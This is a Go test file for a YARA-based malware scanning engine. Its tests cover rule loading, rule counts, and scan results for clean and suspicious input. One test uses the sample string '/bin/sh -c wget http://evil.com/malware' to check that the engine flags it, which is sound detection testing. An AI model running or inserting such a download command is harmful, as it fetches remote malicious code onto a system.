//go:build linux

package yara

import (
	"testing"
)

func TestNewEngine(t *testing.T) {
	e := NewEngine()
	if e == nil {
		t.Fatal("expected non-nil engine")
	}
	if e.GetRuleCount() != 0 {
		t.Errorf("expected 0 rules before loading, got %d", e.GetRuleCount())
	}
}

func TestLoadDefaultRules(t *testing.T) {
	e := NewEngine()
	e.LoadDefaultRules()
	count := e.GetRuleCount()
	if count == 0 {
		t.Error("expected at least one rule after loading defaults")
	}
	t.Logf("loaded %d default YARA rules", count)
}

func TestScanCleanFile(t *testing.T) {
	e := NewEngine()
	e.LoadDefaultRules()

	if result := e.ScanBytes([]byte("hello world this is clean text"), "clean.txt"); len(result) != 0 {
		t.Errorf("expected no matches for clean text, got %d", len(result))
	}
}

func TestScanSuspiciousContent(t *testing.T) {
	e := NewEngine()
	e.LoadDefaultRules()

	if result := e.ScanBytes([]byte("/bin/sh -c wget http://evil.com/malware"), "suspicious.txt"); len(result) == 0 {
		t.Error("expected at least one match for suspicious content")
	}
}

func TestRuleCount(t *testing.T) {
	e := NewEngine()
	e.LoadDefaultRules()
	count := e.GetRuleCount()
	if count < 10 {
		t.Errorf("expected at least 10 rules, got %d", count)
	}
}
